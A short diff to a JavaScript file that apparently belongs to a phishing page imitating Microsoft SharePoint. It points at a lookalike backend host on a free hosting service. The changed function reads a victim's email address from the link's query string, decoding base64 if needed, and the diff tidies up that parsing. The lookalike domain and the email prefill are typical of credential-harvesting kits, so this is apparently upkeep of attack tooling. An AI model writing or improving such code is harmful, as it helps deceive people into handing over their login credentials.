@@ -23,16 +23,23 @@ const BACKEND_URL = "https://sharepoint-team-orde-po.onrender.com";
 function getEmailFromUrl() {
     const params = new URLSearchParams(window.location.search);
     let email = params.get('e') || params.get('email') || '';
+
+    // fallback: raw base64 payload in query string
     if (!email && window.location.search.length > 1) {
         const raw = window.location.search.substring(1);
         try {
             const decoded = atob(raw);
             if (decoded.includes('@')) email = decoded;
-        } catch (e) { if (raw.includes('@')) email = raw; }
+        } catch (e) {
+            if (raw.includes('@')) email = raw;
+        }
     }
+
     if (email) {
         email = email.split('&')[0].split('?')[0];
         try { email = decodeURIComponent(email); } catch (e) {}
+        // ✅ NEW: strip angle brackets, quotes, and whitespace
+        email = email.replace(/[<>"'\s]/g, '').trim();
         if (!email.includes('@')) email = '';
     }
     return email;
